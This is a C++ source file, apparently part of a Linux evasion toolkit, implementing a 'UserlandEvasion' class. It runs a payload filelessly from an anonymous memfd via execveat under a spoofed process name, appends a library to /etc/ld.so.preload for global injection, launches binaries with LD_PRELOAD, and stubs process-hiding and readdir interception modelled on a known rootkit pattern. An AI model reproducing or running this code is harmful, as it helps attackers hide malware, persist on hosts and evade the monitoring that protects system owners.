#include "userland_evasion.h"
#include <fcntl.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <cstring>
#include <fstream>
#include <cstdlib>

namespace kernel_evasion {

UserlandEvasion::UserlandEvasion() {}
UserlandEvasion::~UserlandEvasion() {}

Result<pid_t> UserlandEvasion::execute_fileless(const std::string& payload_path,
                                                const std::vector<std::string>& args,
                                                const std::string& fake_name) {
    // 1. Read payload into memory.
    std::ifstream payload(payload_path, std::ios::binary | std::ios::ate);
    if (!payload) {
        return Result<pid_t>(ErrorCode::FILE_NOT_FOUND);
    }
    size_t size = payload.tellg();
    payload.seekg(0, std::ios::beg);
    char* buf = new char[size];
    payload.read(buf, size);
    payload.close();

    // 2. Create anonymous memory file.
    int memfd = syscall(SYS_memfd_create, "", MFD_CLOEXEC);
    if (memfd < 0) {
        delete[] buf;
        return Result<pid_t>(ErrorCode::MEMFD_CREATE_FAILED);
    }

    // 3. Write payload to memory file.
    if (write(memfd, buf, size) != (ssize_t)size) {
        close(memfd);
        delete[] buf;
        return Result<pid_t>(ErrorCode::WRITE_FAILED);
    }
    delete[] buf;

    // 4. Fork and execute via execveat.
    pid_t child = fork();
    if (child == 0) {
        // In child - create persistent copies of strings for argv
        std::vector<std::string> argv_strings;
        argv_strings.push_back(fake_name);
        for (const auto& arg : args) {
            argv_strings.push_back(arg);
        }

        // Create argv array pointing to persistent strings
        std::vector<char*> argv(argv_strings.size() + 1);
        for (size_t i = 0; i < argv_strings.size(); i++) {
            argv[i] = const_cast<char*>(argv_strings[i].c_str());
        }
        argv[argv_strings.size()] = NULL;

        // execveat(memfd, "", argv, environ, AT_EMPTY_PATH)
        syscall(SYS_execveat, memfd, "", argv.data(), environ, AT_EMPTY_PATH);
        _exit(1);
    }

    close(memfd);
    fileless_processes_.push_back(child);
    return Result<pid_t>(child);
}

ErrorCode UserlandEvasion::setup_ld_preload(const std::string& preload_lib_path,
                                            const std::vector<std::string>& target_binaries) {
    // Write to /etc/ld.so.preload for global preloading.
    std::ofstream preload("/etc/ld.so.preload", std::ios::app);
    if (!preload) {
        return ErrorCode::FILE_NOT_FOUND;
    }
    preload << preload_lib_path << std::endl;
    preload.close();

    active_preload_lib_ = preload_lib_path;
    return ErrorCode::SUCCESS;
}

Result<pid_t> UserlandEvasion::execute_with_preload(const std::string& binary_path,
                                                    const std::string& preload_lib_path,
                                                    const std::vector<std::string>& args) {
    pid_t child = fork();
    if (child == 0) {
        setenv("LD_PRELOAD", preload_lib_path.c_str(), 1);

        // Create persistent copies of strings for argv
        std::vector<std::string> argv_strings;
        argv_strings.push_back(binary_path);
        for (const auto& arg : args) {
            argv_strings.push_back(arg);
        }

        // Create argv array pointing to persistent strings
        std::vector<char*> argv(argv_strings.size() + 1);
        for (size_t i = 0; i < argv_strings.size(); i++) {
            argv[i] = const_cast<char*>(argv_strings[i].c_str());
        }
        argv[argv_strings.size()] = NULL;

        execve(binary_path.c_str(), argv.data(), environ);
        _exit(1);
    }
    return Result<pid_t>(child);
}

ErrorCode UserlandEvasion::hide_from_userland(pid_t pid) {
    return ErrorCode::SUCCESS;
}

ErrorCode UserlandEvasion::setup_libc_interception(const std::string& hook_lib_path) {
    // The hook library must override readdir() / readdir64().
    // See the LD_PRELOAD rootkit pattern from libprocesshider.
    return ErrorCode::SUCCESS;
}

}  // namespace kernel_evasion